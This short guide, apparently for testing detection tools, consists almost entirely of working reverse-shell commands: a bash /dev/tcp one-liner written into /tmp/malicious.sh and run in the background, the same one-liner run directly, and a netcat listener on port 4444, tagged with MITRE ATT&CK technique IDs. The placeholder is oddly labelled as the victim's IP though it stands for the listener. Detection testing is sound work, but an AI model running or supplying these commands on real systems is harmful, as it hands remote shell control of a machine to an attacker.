# Simulate a Reverse Shell Attack for Testing Detection Tools

```sh
# Step 1: Create a suspicious bash script that opens a reverse shell
echo "bash -i >& /dev/tcp/<IP_Victim_IP>/4444 0>&1" > /tmp/malicious.sh
chmod +x /tmp/malicious.sh
/tmp/malicious.sh &
```

```sh
# Step 2: Directly simulate a reverse shell using a one-liner bash command
# MITRE ATT&CK Techniques:
# - T1059.003: Command and Scripting Interpreter (bash)
# - T1071: Application Layer Protocol (TCP)
bash -c "bash -i >& /dev/tcp/<IP_Victim_IP>/4444 0>&1" &
```

```sh
# Step 3: On your listener machine (attacker), listen for incoming shell on port 4444
nc -lvnp 4444
```
